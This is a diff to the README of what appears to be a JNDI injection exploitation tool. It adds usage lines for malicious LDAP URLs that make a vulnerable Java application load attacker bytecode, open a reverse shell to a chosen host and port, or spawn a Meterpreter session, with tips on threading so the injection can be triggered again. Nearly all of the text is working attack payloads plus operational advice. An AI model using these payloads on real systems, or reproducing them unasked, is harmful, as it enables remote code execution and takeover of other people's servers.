@@ -103,9 +103,18 @@ ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
 ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # the path is relative to the current directory
 ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>
 
-# spawn reverse shell (supports Windows)
+# spawn reverse shell (based on Java code, supports Windows)
+
+# spawn reverse shell in current thread (suitable for simple scenarios, such as single-threaded applications)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
+
+# spawn reverse shell in a new thread (suitable for complex scenarios, such as multi-threaded web servers)
+ldap://127.0.0.1:1389/Basic/ReverseShell/Thread/127.0.0.1/4444
+ldap://127.0.0.1:1389/Basic/ReverseShell/Thread/MTI3LjAuMC4x/NDQ0NA==
+
+# In complex scenarios, if you use "spawn reverse shell in current thread", you must exit using the `exit` command (DO NOT USE Ctrl-C), otherwise JNDI injection will NOT be triggered again
+# If you use "spawn reverse shell in a new thread", this issue does not occur
 
 # spawn Meterpreter (java/meterpreter/reverse_tcp)
 ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
